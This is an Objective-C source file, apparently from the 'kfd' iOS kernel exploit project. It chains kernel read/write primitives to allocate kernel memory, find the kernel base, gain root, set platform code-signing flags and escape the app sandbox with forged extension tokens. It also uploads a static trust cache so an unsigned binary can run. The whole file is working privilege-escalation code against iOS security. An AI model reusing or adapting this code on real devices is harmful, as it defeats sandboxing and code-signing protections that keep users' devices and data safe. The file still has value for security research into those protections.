//
//  fun.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import <spawn.h>
#import <sys/stat.h>
#import "krw.h"
#import "offsets.h"
#import "sandbox.h"
#import "trustcache.h"
#import "escalate.h"
#import "utils.h"
#import "fun.h"
#import "proc.h"
#import "vnode.h"

void test_kalloc_kfree(void) {
    size_t allocated_size = 0x1000;
    uint64_t allocated_kmem = kalloc(allocated_size);
    kwrite64(allocated_kmem, 0x4142434445464748);
    printf("[+] allocated_kmem: 0x%llx\n", allocated_kmem);
    HexDump(allocated_kmem, allocated_size);
    
    kfree(allocated_kmem, allocated_size);
}

void test_platformize(void) {
    set_task_platform(getpid(), true);
    set_proc_csflags(getpid());
    set_csb_platform_binary(getpid());
}

void test_unsandbox(void) {
    char* _token = token_by_sandbox_extension_issue_file("com.apple.app-sandbox.read-write", "/", 0);
    printf("consume ret: %lld\n", sandbox_extension_consume(_token));
    char* _token2 = token_by_sandbox_extension_issue_file("com.apple.sandbox.executable", "/", 0);
    printf("token2: %s\n", _token2);
    printf("consume ret: %lld\n", sandbox_extension_consume(_token2));

}

int do_fun(void) {
    _offsets_init();
    
    uint64_t kslide = get_kslide();
    uint64_t kbase = 0xfffffff007004000 + kslide;
    
    printf("[i] Kernel base: 0x%llx\n", kbase);
    printf("[i] Kernel slide: 0x%llx\n", kslide);
    uint64_t kheader64 = kread64(kbase);
    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
    
    printf("[i] rootify ret: %d\n", rootify(getpid()));
    printf("[i] uid: %d, gid: %d\n", getuid(), getgid());

    prepare_kcall();
    
    test_platformize();
    
    uint64_t sb = unsandbox(getpid());

    util_runCommand("/bin/ps", "-A", NULL);
    
    const char* path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/unsignedhelloworld"].UTF8String;
    chmod(path, 0755);
    printf("unsigned binaries path: %s\n", path);
    util_runCommand(path, NULL, NULL);
    
    
    NSString* tcpath = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries.tc"];
    staticTrustCacheUploadFileAtPath(tcpath, NULL);
    
    util_runCommand(path, NULL, NULL);
    
    sandbox(getpid(), sb);
    
    return 0;
}
